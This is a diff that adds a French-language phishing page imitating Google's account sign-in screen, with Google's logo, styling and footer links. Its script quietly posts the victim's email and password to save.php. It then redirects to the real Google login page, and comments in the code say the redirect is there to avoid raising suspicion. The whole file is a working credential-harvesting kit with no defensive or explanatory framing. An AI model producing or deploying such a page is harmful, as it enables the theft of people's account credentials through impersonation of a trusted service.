@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Connexion - Comptes Google</title>
+  <style>
+    /* Style Google Moderne */
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Roboto', arial, sans-serif;
+      background-color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      color: #202124;
+    }
+
+    .main-container {
+      width: 100%;
+      max-width: 450px;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      padding: 48px 40px 36px;
+      text-align: center;
+    }
+
+    .logo { margin-bottom: 10px; }
+    h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
+    .subtitle { font-size: 16px; line-height: 1.5; margin-bottom: 32px; }
+
+    .form-group { position: relative; margin-bottom: 24px; text-align: left; }
+    input {
+      width: 100%;
+      padding: 13px 15px;
+      font-size: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      outline: none;
+    }
+    input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+
+    .blue-link {
+      color: #1a73e8;
+      font-weight: 500;
+      font-size: 14px;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    .footer-buttons {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 40px;
+    }
+    .btn-next {
+      background-color: #1a73e8;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      padding: 10px 24px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    .bottom-links {
+      display: flex;
+      justify-content: space-between;
+      width: 100%;
+      max-width: 450px;
+      margin-top: 24px;
+      font-size: 12px;
+      color: #70757a;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="main-container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75" alt="Google">
+    </div>
+    <h1>Connexion</h1>
+    <p class="subtitle">Utiliser votre compte Google pour accéder à Google Sites.</p>
+
+    <form id="phishingForm">
+      <div class="form-group">
+        <input type="email" id="emailInput" placeholder="Adresse e-mail ou téléphone" required>
+      </div>
+
+      <div class="form-group">
+        <input type="password" id="passwordInput" placeholder="Saisissez votre mot de passe" required>
+      </div>
+
+      <div class="footer-buttons">
+        <button type="button" style="background:none; border:none; color:#1a73e8; cursor:pointer; font-weight:500;">Créer un compte</button>
+        <button type="submit" class="btn-next">Suivant</button>
+      </div>
+    </form>
+  </div>
+
+  <div class="bottom-links">
+    <span>Français (France) ▼</span>
+    <div style="display:flex; gap:20px;">
+      <span>Aide</span>
+      <span>Confidentialité</span>
+      <span>Conditions</span>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('phishingForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const email = document.getElementById('emailInput').value;
+      const password = document.getElementById('passwordInput').value;
+
+      const formData = new FormData();
+      formData.append('email', email);
+      formData.append('password', password);
+
+      // 1. Enregistrement silencieux dans la base
+      fetch('save.php', {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => {
+        // 2. REDIRECTION IMMÉDIATE vers la vraie page Google
+        // L'utilisateur pensera qu'il doit se reconnecter
+        window.location.href = "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fsites.google.com";
+      })
+      .catch(err => {
+        // Même en cas d'erreur, on redirige pour ne pas éveiller les soupçons
+        window.location.href = "https://accounts.google.com/signin";
+      });
+    });
+  </script>
+
+</body>
+</html>
